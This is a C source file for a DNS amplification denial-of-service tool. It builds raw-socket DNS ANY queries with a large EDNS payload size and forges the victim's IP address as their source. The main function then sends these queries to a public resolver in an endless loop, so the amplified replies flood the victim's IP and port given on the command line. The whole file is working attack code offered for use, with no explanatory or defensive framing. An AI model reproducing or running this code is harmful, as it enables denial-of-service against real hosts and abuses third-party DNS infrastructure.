#include "dns.h"
#include <string.h>

unsigned short checkSum(unsigned short *ptr, int numBytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(numBytes>1) {
		sum+=*ptr++;
		numBytes-=2;
	}
	if(numBytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void querySiteFormat(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

// Creates the dns header and packet
void dnsHeaderCreate(dnsHeader *dns)
{
	dns->id = (unsigned short) htons(getpid());
	dns->flags = htons(0x0120);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	dns->add = htons(1);
}

void eDnsHeaderCreate(eDnsHeader *eDns){
	eDns->name = 0;
	eDns->type = htons(41);
	eDns->udpPayloadSize = htons(0x1000);
	eDns->higherBits = 0;
	eDns->eDnsVersion = 0;
	eDns->z = 0;
	eDns->dataLength = 0;
}

void ipHeaderCreate(iph *ip){
	ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    
}

void queryset(query *q){
	q->qtype = htons(0x00ff);
	q->qclass = htons(0x1);
}

void dnsAmplificationAttack(char *targetIp, int targetPort)
{
	char *dnsIp = "8.8.8.8";
	int dnsPort = 53;
	
	unsigned char dnsRequestPacket[139];
	unsigned char *dnsRecord = "github.com";
	
	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
	dnsHeaderCreate(dns);
	
	unsigned char *dnsName, dnsRcrd[32];
	dnsName = (unsigned char *)&dnsRequestPacket[sizeof(dnsHeader)];
	strcpy(dnsRcrd, dnsRecord);
	querySiteFormat(dnsName , dnsRcrd);
	
	query *q;
	q = (query *)&dnsRequestPacket[sizeof(dnsHeader) + (strlen(dnsName)+1)];
	queryset(q);
	

	eDnsHeader *eDns;
	eDns = (eDnsHeader *)&dnsRequestPacket[sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query)];
	eDnsHeaderCreate(eDns);
	
	
	char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
	data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, &dnsRequestPacket, sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) +1 + sizeof(eDnsHeader));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dnsPort);
    sin.sin_addr.s_addr = inet_addr(dnsIp);
    
    iph *ip = (iph *)datagram;
    ipHeaderCreate(ip);
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader);
    ip->saddr = inet_addr(targetIp);
	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
	ip->daddr = sin.sin_addr.s_addr;
	
    udph *udp = (udph *)(datagram + sizeof(iph));
	udp->source = htons(targetPort);
    udp->dest = htons(dnsPort);
    udp->len = htons(8+sizeof(dnsHeader)+(strlen(dnsName)+1)+sizeof(query)+sizeof(eDnsHeader));
    udp->check = 0;
	
	// Pseudoheader creation and checksum calculation
	psHeader pshdr;
	pshdr.saddr = inet_addr(targetIp);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader));

	int pssize = sizeof(psHeader) + sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader);
    psgram = malloc(pssize);
	
    memcpy(psgram, (char *)&pshdr, sizeof(psHeader));
    memcpy(psgram + sizeof(psHeader), udp, sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader));
		
    udp->check = checkSum((unsigned short *)psgram, pssize);
    
    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd==-1) printf("Could not create socket.\n");
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
	free(psgram);
	close(sd);
	
	return;
}

int main(int argc, char **argv)
{	
	if(getuid()!=0)
		printf("You must be running as root!\n");
	if(argc<3)
		printf("Usage: %s victimIp victimPort\n", argv[0]);
	
	char *victimIp = argv[1];
	int victimPort = atoi(argv[2]);
	
	while(1) {
		printf("dns send\n");
		dnsAmplificationAttack(victimIp, victimPort);
		sleep(5);
	}	

	return 0;
}
